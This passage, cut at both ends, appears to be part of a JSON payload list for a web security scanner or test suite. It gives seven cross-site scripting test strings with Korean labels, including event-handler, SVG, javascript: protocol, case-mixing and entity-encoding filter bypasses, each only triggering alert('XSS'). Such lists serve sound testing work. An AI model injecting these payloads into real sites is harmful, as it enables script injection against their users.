        { "id": "xss_2", "name": "이미지 이벤트", "payload": "<img src=x onerror=alert('XSS')>", "description": "onerror 이벤트 활용", "risk": "high" },
        { "id": "xss_3", "name": "SVG 기반", "payload": "<svg onload=alert('XSS')>", "description": "SVG 태그 활용", "risk": "high" },
        { "id": "xss_4", "name": "JavaScript 프로토콜", "payload": "javascript:alert('XSS')", "description": "javascript: 프로토콜", "risk": "medium" },
        { "id": "xss_5", "name": "태그 대소문자", "payload": "<ScRiPt>alert('XSS')</ScRiPt>", "description": "대소문자 혼합 우회", "risk": "high" },
        { "id": "xss_6", "name": "인코딩 우회", "payload": "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;", "description": "HTML 엔티티 인코딩", "risk": "high" },
        { "id": "xss_7", "name": "이벤트 핸들러", "payload": "\" onmouseover=\"alert('XSS')", "description": "속성 기반 XSS", "risk": "medium" },
        { "id": "xss_8", "name": "공백 없는 페이로드", "payload": "<svg/onload=alert('XSS')>", "description": "공백 필터 우회", "risk": "high" }
      ]
    },
